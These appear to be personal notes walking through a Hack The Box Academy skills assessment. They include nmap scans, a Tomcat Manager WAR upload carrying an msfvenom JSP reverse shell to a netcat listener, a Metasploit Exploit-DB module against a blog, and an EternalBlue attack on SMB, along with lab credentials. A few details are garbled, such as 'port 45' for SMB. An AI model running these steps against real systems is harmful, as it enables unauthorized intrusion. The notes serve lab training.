### What is the hostname of Host-1? (answer in all lowercase)"
1.rdp into the target machine
	a.xfreerdp /v:10.129.204.126 /u:htb-student /p:HTB_@cademy_stdnt!
2.then run nmap to find the host name
a.nmap 172.16.1.11 -A


### "Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)"(PAGE 8-9)
1.notice that port 8080 is open from the previous nmap scan on host-1
2.open up firefox in the target machine by typing firefox in the terminal
3.type the ip of host one in the browser
	a.http://172.16.1.11:8080 in the firefox browser
4.open up the manager App
	a.enter the credential tomcat:Tomcatadm(these are provided in the hint)
	b.select sign in
5.start a nc listener that will catch the reverse shell on the jump host (the target machine)
	a. sudo nc -nvlp 4444(4444 is a random port number im using)
6.build the payload first start by searching for an ip in the jump host(target machine) that the host machine-1 can reach
	a.on the jump host run ip a
	b. look for something like eth1: ... inet 172.16.1.X/24 ...
7.run the msfvenom command in host-1
	a.msfvenom -p java/jsp_shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f war -o managerUpdated.war
8.then i need to upload the malicious war file
	a.go to the war files to deploy section> browse >home>managerUpdated.war>hit deploy
9.notice the new path
	a./managerUpdated(same as the one from the payload)
10.Travel to that new path
	a.just click on the url
	b.that will trigger the web shell and you can see the out put in the net cat listener
11.find the folder in shares
	a. run the dir C:\Shares\ command
	
	
	### Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt
1.rdp into the target machine
	a.xfreerdp /v:10.129.204.126 /u:htb-student /p:HTB_@cademy_stdnt!
2.open up the blog using firefox
	a.firefox blog.inlanefreight.local
3.notice that there is a post talking about the vulnerability in that blog post
4.notice that under hint 3 you are given the credentials
	a.admin:admin123!@#
5.launch msfconsole in the jump box and use `50064.rb` module:(a script from exploit DB that has been manually added)
	a.msfconsole -q use 50064.rb
6.modify the 50064.rb module accordingly
a.
set VHOST blog.inlanefreight.local 
set RHOSTS 172.16.1.12
set RHOST 172.16.1.12 
set USERNAME admin 
set PASSWORD admin123!@#

7.read the contents of  /customscripts/flag.txt using cat
a. cat  /customscripts/flag.txt


### Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt

1.rdp into the jump box
	a.xfreerdp /v:10.129.204.126 /u:htb-student /p:HTB_@cademy_stdnt!
2.run an nmap scan on host 3
	a.sudo nmap 172.16.1.13 -A
	b.notice that port 45 is open for smb
3.run metasploitable and run the eternal blueattack for smb(notice the hint, hints towards eternal blue)
	a.msfconsole
	b.use exploit/windows/smb/ms17_010_psexec
4.configure eternal blues payload
	a.set LHOST IP(jump box ip)
	b.set RHOST IP(target machine you are attacking)
5.launch the exploit
	a.type exploit
6.read the flag in C:\Users\Administrator\Desktop\Skills-flag.txt
a .cat  C:/Users/Administrator/Desktop/Skills-flag.txt
